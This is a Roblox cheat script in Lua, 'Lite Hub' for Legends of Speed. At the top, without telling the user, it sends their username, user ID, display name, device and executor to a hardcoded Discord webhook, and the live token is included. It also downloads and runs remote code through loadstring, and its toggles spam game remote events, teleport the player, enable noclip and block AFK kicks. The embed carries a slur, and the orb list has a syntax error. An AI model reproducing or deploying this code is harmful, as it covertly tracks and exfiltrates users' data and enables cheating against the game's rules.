  -- syn request cuz sigma
local req = http_request or request or (syn and syn.request)

-- Lite Hub webhook for the muscle legends version not the legends of speed lmao
local webhookUrl = "https://discord.com/api/webhooks/1328791750273142834/iqCXOsYI19_Um-0-qdZBogqKdIcQ_kpbhiW0F7XJduGMXzladO3YZ6tFw8rlcsHx1tad"

-- roblox services 
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")

-- local player information like the device they are on while using Lite Hub
local player = Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local displayName = player.DisplayName
local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"

-- which executors will say if they are using them
local function detectExecutor()
    if syn then
        return "Synapse X"
    elseif iskrnlclosure then
        return "KRNL"
    elseif fluxus then
        return "Fluxus"
    elseif Arceus then
        return "Arceus X"
    elseif delta then
        return "Delta"
    elseif codex then
        return "Code X"
    elseif cubix then
        return "Cubix"
    elseif nezur then
        return "Nezur"
    elseif getexecutorname then
        return getexecutorname()  -- For executors that may have this function
    elseif identifyexecutor then
        return identifyexecutor()  -- Another alternative
    else
        return "Unknown Executor"
    end
end

local executor = detectExecutor()

-- the things that will be sent to the discord
local body = {
    embeds = {{
        title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
        description = "Username = " .. username ..
                      "\nUserID = " .. userId ..
                      "\nDisplay Name = " .. displayName ..
                      "\nDevice Type = " .. deviceType ..
                      "\nExecutor = " .. executor,
        color = 0,
        author = { name = "Adopt T Gay" }
    }}
}

-- encode the data as JSON
local jsonData = HttpService:JSONEncode(body)

-- send the persons things to discord
req({
    Url = webhookUrl,
    Method = 'POST',
    Headers = { ['Content-Type'] = 'application/json' },
    Body = jsonData
})




local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
local SaveManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/SaveManager.luau"))()
local InterfaceManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/InterfaceManager.luau"))()

local Window = Library:CreateWindow{
    Title = `Lite Hub Legends Of Speed`,
    SubTitle = "by Actual Master Oogway",
    TabWidth = 160,
    Size = UDim2.fromOffset(830, 525),
    Resize = true, -- Resize this ^ Size according to a 1920x1080 screen, good for mobile users but may look weird on some devices
    MinSize = Vector2.new(470, 380),
    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.RightControl -- Used when theres no MinimizeKeybind
}

local Tabs = {
    Main = Window:CreateTab{
        Title = "Main",
        Icon = "" -- Icon is now empty
    },
    Farming = Window:CreateTab{
        Title = "Farming",
        Icon = "" -- Icon is now empty
    },
    AutoRace = Window:CreateTab{
        Title = "Auto Race",
        Icon = "" -- Icon is now empty
    },
    Settings = Window:CreateTab{
        Title = "Settings",
        Icon = "" -- Icon is now empty
    }
}

-- Values
getgenv().AutoHoop = false
getgenv().JumpPower = 180  -- Default Jump Power
getgenv().WalkSpeed = 16   -- Default Walk Speed
getgenv().AutoOrbs = false
getgenv().SelectCity = "City"
getgenv().SelectOrb = "Red Orb"
getgenv().Invisible = false
getgenv().WallHack = false
getgenv().AntiPing = false  -- Anti Ping variable
getgenv().AntiCrash = false -- Anti Crash variable
getgenv().AutoFinishRace = false -- Auto Finish Race variable
getgenv().AutoFillRace = false -- Auto Fill Race variable

-- Functions
function AutoFinishRace()
    while _G.AutoFinishRace do
        local positions = {
            CFrame.new(1686.07495, 36.3147125, -5946.63428, -0.984812617, 0, 0.173621148, 0, 1, 0, -0.173621148, 0, -0.984812617),
            CFrame.new(48.3109131, 36.3147125, -8680.45312, -1, 0, 0, 0, 1, 0, 0, 0, -1),
            CFrame.new(1001.33118, 36.3147125, -10986.2178, -0.996191859, 0, -0.0871884301, 0, 1, 0, 0.0871884301, 0, -0.996191859)
        }

        local plr = game.Players.LocalPlayer
        local char = plr.Character

        if char and char:FindFirstChild("HumanoidRootPart") then
            for _, cframe in ipairs(positions) do
                char.HumanoidRootPart.CFrame = cframe
                wait(0.01) -- Adjust the wait time as needed
            end
        end
    end
end

function joinRace()
    while _G.AutoFillRace do
        local args = {
            [1] = "joinRace"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("raceEvent"):FireServer(unpack(args))
        wait(0.0001) -- Adjusted wait time for performance
    end
end

function AutoOrb()
    while _G.AutoOrbs do
        local args = {
            [1] = "collectOrb",
            [2] = _G.SelectOrb,
            [3] = _G.SelectCity
        }
        for i = 1, 200 do
            game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("orbEvent"):FireServer(unpack(args))
        end
        wait(0.25)
    end
end

-- Adding the Tabs content and functionality as needed.
-- Example: Main Tab Toggle
Tabs.Main:CreateToggle("Auto Hoop", {
    Title = "Auto Hoop",
    Callback = function(Value)
        getgenv().AutoHoop = Value
        if Value then
            spawn(function()
                while getgenv().AutoHoop do
                    for i, v in pairs(game:GetService("Workspace").Hoops:GetChildren()) do
                        firetouchinterest(v, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, 0)
                        wait()
                        firetouchinterest(v, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, 1)
                    end
                    wait(0.5)
                end
            end)
        end
    end
})

Tabs.Settings:CreateLabel("Jump/Speed Settings")
Tabs.Settings:CreateSlider("Jump Power", {
    Min = 180,
    Max = 10000,
    Default = 180,
    Callback = function(Value)
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = Value
    end
})

Tabs.Settings:CreateSlider("Speed Power", {
    Min = 16,
    Max = 10000,
    Default = 16,
    Callback = function(Value)
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = Value
    end
})

Tabs.Settings:CreateLabel("Touch")
Tabs.Settings:CreateToggle("Invisible", {
    Callback = function(Value)
        getgenv().Invisible = Value
        local character = game.Players.LocalPlayer.Character
        if character then
            if Value then
                character.HumanoidRootPart.Transparency = 1
                character.HumanoidRootPart.CanCollide = false
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("MeshPart") or part:IsA("Part") then
                        part.Transparency = 1
                        part.CanCollide = false
                    end
                end
            else
                character.HumanoidRootPart.Transparency = 0
                character.HumanoidRootPart.CanCollide = true
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("MeshPart") or part:IsA("Part") then
                        part.Transparency = 0
                        part.CanCollide = true
                    end
                end
            end
        end
    end
})

Tabs.Settings:CreateToggle("WallHack", {
    Callback = function(Value)
        getgenv().WallHack = Value
        local character = game.Players.LocalPlayer.Character
        if character then
            if Value then
                character.HumanoidRootPart.CanCollide = false
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("MeshPart") or part:IsA("Part") then
                        part.CanCollide = false
                    end
                end
            else
                character.HumanoidRootPart.CanCollide = true
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("MeshPart") or part:IsA("Part") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end
})

Tabs.Settings:CreateToggle("Anti Ping", {
    Callback = function(Value)
        _G.AntiPing = Value
        if Value then
            local decalsyeeted = true
            local g = game
            local w = g.Workspace
            local l = g.Lighting
            local t = w.Terrain
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
            l.GlobalShadows = false
            l.FogEnd = 9e9
            l.Brightness = 0
            settings().Rendering.QualityLevel = "Level01"
            for i, v in pairs(g:GetDescendants()) do
                if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                elseif v:IsA("Explosion") then
                    v.BlastPressure = 1
                    v.BlastRadius = 1
                elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
                    v.Enabled = false
                elseif v:IsA("MeshPart") then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                    v.TextureID = 10385902758728957
                end
            end
            for i, e in pairs(l:GetChildren()) do
                if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                    e.Enabled = false
                end
            end
        end
    end
})

Tabs.Settings:CreateToggle("Anti Crash", {
    Callback = function(Value)
        _G.AntiCrash = Value
        if Value then
            wait(0.5)
            local ba = Instance.new("ScreenGui")
            local ca = Instance.new("TextLabel")
            local da = Instance.new("Frame")
            local _b = Instance.new("TextLabel")
            local ab = Instance.new("TextLabel")
            ba.Parent = game.CoreGui
            ba.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            ca.Parent = ba
            ca.Active = true
            ca.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            ca.Draggable = true
            ca.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
            ca.Size = UDim2.new(0, 370, 0, 52)
            ca.Font = Enum.Font.SourceSansSemibold
            ca.Text = "Anti Afk"
            ca.TextColor3 = Color3.new(0, 1, 1)
            ca.TextSize = 22
            da.Parent = ca
            da.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
            da.Position = UDim2.new(0, 0, 1.0192306, 0)
            da.Size = UDim2.new(0, 370, 0, 107)
            _b.Parent = da
            _b.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            _b.Position = UDim2.new(0, 0, 0.800455689, 0)
            _b.Size = UDim2.new(0, 370, 0, 21)
            _b.Font = Enum.Font.Arial
            _b.Text = "Made by luca#5432"
            _b.TextColor3 = Color3.new(0, 1, 1)
            _b.TextSize = 20
            ab.Parent = da
            ab.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            ab.Position = UDim2.new(0, 0, 0.158377, 0)
            ab.Size = UDim2.new(0, 370, 0, 44)
            ab.Font = Enum.Font.ArialBold
            ab.Text = "Status: Active"
            ab.TextColor3 = Color3.new(0, 1, 1)
            ab.TextSize = 20
            local bb = game:service'VirtualUser'
            game:service'Players'.LocalPlayer.Idled:connect(function()
                bb:CaptureController()
                bb:ClickButton2(Vector2.new())
                ab.Text = "Roblox tried kicking you but I didn't let them!"
                wait(2)
                ab.Text = "Status : Active"
            end)
        end
    end
})

Tabs.AutoRace:CreateToggle("Auto Finish Race", {
    Callback = function(Value)
        _G.AutoFinishRace = Value
        if Value then
            spawn(AutoFinishRace)
        end
    end
})

Tabs.AutoRace:CreateToggle("Auto Fills", {
    Callback = function(Value)
        _G.AutoFillRace = Value
        if Value then
            spawn(joinRace)
        end
    end
})

Tabs.Farming:CreateDropdown("Select City", {
    Options = {"City", "Snow City", "Magma City", "Legends Highway", "Space", "Desert"},
    Callback = function(Value)
        _G.SelectCity = Value
    end
})

Tabs.Farming:CreateDropdown("Select Orb", {
    Options = {"Red Orb", "Blue Orb", "Orange Orb", "Gem", "Yellow Orb" "Ethereal Orb"},
    Callback = function(Value)
        _G.SelectOrb = Value
    end
})

Tabs.Farming:CreateToggle("Auto Orb", {
    Callback = function(Value)
        _G.AutoOrbs = Value
        if Value then
            spawn(AutoOrb)
        end
    end
})

-- Add Rebirth Tab
local RebirthTab = Window:CreateTab{
    Title = "Rebirth",
    Icon = "" -- Icon is now empty
}

-- Rebirth Values
getgenv().autoRebirth = false
getgenv().rebirthStoppingPoint = 0
getgenv().rebirthUntilReachAmount = false

-- Functions
function autoRebirth()
    while _G.autoRebirth do
        local args = {
            [1] = "rebirthRequest"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("rebirthEvent"):FireServer(unpack(args))
        wait(0.1)
    end
end

function checkRebirth()
    local plr = game.Players.LocalPlayer
    local rebirths = plr:WaitForChild("leaderstats"):WaitForChild("Rebirths") -- Assuming 'Rebirths' is stored under leaderstats

    -- Loop to auto rebirth until the stopping point is reached
    while _G.rebirthUntilReachAmount do
        if rebirths.Value >= _G.rebirthStoppingPoint then
            _G.rebirthUntilReachAmount = false
            break
        end
        autoRebirth() -- Calls the rebirth function
        wait(0.1) -- Adjust the wait time as needed
    end
end

-- Rebirth Tab Controls
RebirthTab:CreateToggle("Auto Rebirth", {
    Callback = function(Value)
        _G.autoRebirth = Value
        if Value then
            spawn(autoRebirth)
        end
    end
})

RebirthTab:CreateTextbox("Rebirth Stopping Point", {
    Text = "Enter stopping point",
    Callback = function(Value)
        _G.rebirthStoppingPoint = tonumber(Value) or 0
    end
})

RebirthTab:CreateToggle("Rebirth Until Reach Chosen Amount", {
    Callback = function(Value)
        _G.rebirthUntilReachAmount = Value
        if Value then
            spawn(checkRebirth) -- Start checking the rebirth count
        end
    end
})

-- Add Teleport Tab
local TeleportTab = Window:CreateTab{
    Title = "Teleport",
    Icon = "" -- Icon is now empty
}

-- Function to teleport the player to a specific island
function teleportToIsland(island)
    local plr = game.Players.LocalPlayer
    local char = plr.Character

    if char and char:FindFirstChild("HumanoidRootPart") then
        if island == "City" then
            char.HumanoidRootPart.CFrame = CFrame.new(-9684.84473, 60.6541595, 3093.29663) -- City coordinates
        elseif island == "Snow City" then
            char.HumanoidRootPart.CFrame = CFrame.new(-9673.79102, 60.6541595, 3788.24927) -- Snow City coordinates
        elseif island == "Magma City" then
            char.HumanoidRootPart.CFrame = CFrame.new(-11053.1162, 218.589584, 4904.35938) -- Magma City coordinates
        elseif island == "Space" then
            char.HumanoidRootPart.CFrame = CFrame.new(-331.764069, 5.45415115, 585.201721) -- Space coordinates
        elseif island == "Desert" then
            char.HumanoidRootPart.CFrame = CFrame.new(-9515.24805, 57.1541519, 1607.96765) -- Desert coordinates
        elseif island == "Legends Highway" then
            char.HumanoidRootPart.CFrame = CFrame.new(-13097.0186, 218.589584, 5913.35889) -- Legends Highway coordinates
        end
    end
end

-- Teleport Tab Controls
local teleportToggleValue = false

-- Dropdown for selecting an island
TeleportTab:CreateDropdown("Select Island", {
    Options = {"City", "Snow City", "Magma City", "Space", "Desert", "Legends Highway"},
    Callback = function(Value)
        -- When an island is selected, check if teleport toggle is active
        if teleportToggleValue then
            teleportToIsland(Value) -- Teleport to the selected island
        end
    end
})

-- Toggle for enabling/disabling teleportation
TeleportTab:CreateToggle("Teleport To Island", {
    Callback = function(Value)
        teleportToggleValue = Value
        if teleportToggleValue then
            local selectedIsland = TeleportTab:GetDropdown("Select Island").Selected
            if selectedIsland then
                teleportToIsland(selectedIsland) -- Automatically teleport to the selected island if the toggle is on
            end
        end
    end
})

-- Add Egg Tab
local EggTab = Window:CreateTab{
    Title = "Egg",
    Icon = "" -- Icon is now empty
}

-- Values for Auto Hatch
getgenv().autoHatch = false
getgenv().selectEgg = "Yellow Crystal" -- Default egg

-- Function to hatch the selected egg
function autoHatch()
    while _G.autoHatch do
        local args = {
            [1] = "openCrystal",
            [2] = _G.selectEgg
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("openCrystalRemote"):InvokeServer(unpack(args))
        wait(0.01) -- Adjusted wait time for performance
    end
end

-- Egg Tab Controls
EggTab:CreateDropdown("Select Egg", {
    Options = {"Yellow Crystal", "Blue Crystal", "Red Crystal", "Lightning Crystal", "Inferno Crystal", 
               "Lava Crystal", "Snow Crystal", "Electro Legends Crystal", "Space Crystal", 
               "Alien Crystal", "Electro Crystal", "Desert Crystal", "Jungle Crystal"},
    Callback = function(Value)
        _G.selectEgg = Value -- Set the selected egg
    end
})

EggTab:CreateToggle("Auto Hatch Egg", {
    Callback = function(Value)
        _G.autoHatch = Value
        if Value then
            spawn(autoHatch) -- Start auto-hatching when toggle is enabled
        end
    end
})
